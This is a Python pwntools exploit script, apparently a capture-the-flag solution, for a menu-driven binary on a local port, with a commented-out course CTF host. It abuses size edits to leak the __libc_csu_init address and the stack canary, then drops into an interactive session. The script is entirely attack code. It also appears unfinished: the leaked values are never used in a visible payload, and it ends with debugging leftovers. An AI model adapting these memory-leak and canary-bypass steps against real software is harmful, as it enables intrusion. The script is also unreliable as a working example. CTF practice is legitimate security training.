from pwn import *

r = remote("127.0.0.1", 8888)
# r = remote("ctf.adl.csie.ncu.edu.tw", 11008)
context.arch = "amd64"

# set s[0], s[1], s[2]
r.recvuntil("choice:\n")
r.send("2")
r.recvuntil("?:")
r.send("1")
r.recvuntil(":")
r.send("a" * 0x10)
r.recvuntil("choice:\n")
r.send("2")
r.recvuntil("?:")
r.send("2")
r.recvuntil(":")
r.send("a" * 0x10)
r.recvuntil("choice:\n")
r.send("2")
r.recvuntil("?:")
r.send("3")
r.recvuntil(":")
r.send("a" * 0x10)

# edit, set size = 54(0x36)
r.recvuntil("choice:\n")
r.send("4")
r.recvuntil("?:")
r.send("1")
r.recvuntil(":")
r.send("a" * 0x10)

# get __libc_csu_init
r.recvuntil("choice:\n")
r.send("3")
r.recvuntil("?:")
r.send("1")
r.recvuntil("a" * 0x30)
libc_csu_init = u64(r.recv(6).ljust(8, "\x00"))

# to get canary
## set the first byte of the canary, and size is 38(0x26) now
r.recvuntil("choice:\n")
r.send("4")
r.recvuntil("?:")
r.send("3")
r.recvuntil(":")
r.send("a" * 0x19)

r.recvuntil("choice:\n")
r.send("3")
r.recvuntil("?:")
r.send("1")
r.recvuntil("a" * 0x38)
canary = u64(r.recv(8)) - 0x61

raw_input('data')

# set the size to 0x3e 
r.recvuntil("choice:\n")
r.send("4")
r.recvuntil("?:")
r.send("2")
r.recvuntil(":")
r.send("a")

r.recvuntil("choice:\n")
r.send("4")
r.recvuntil("?:")
r.send("3")
r.recvuntil(":")
r.send("a" * 0x1e + "\x00")

r.recvuntil("choice:\n")
r.send("4")
r.recvuntil("?:")
r.send("1")
r.recvuntil(":")
r.send("a")


#
# r.recvuntil("choice:\n"):x

r.send("5")

r.interactive()
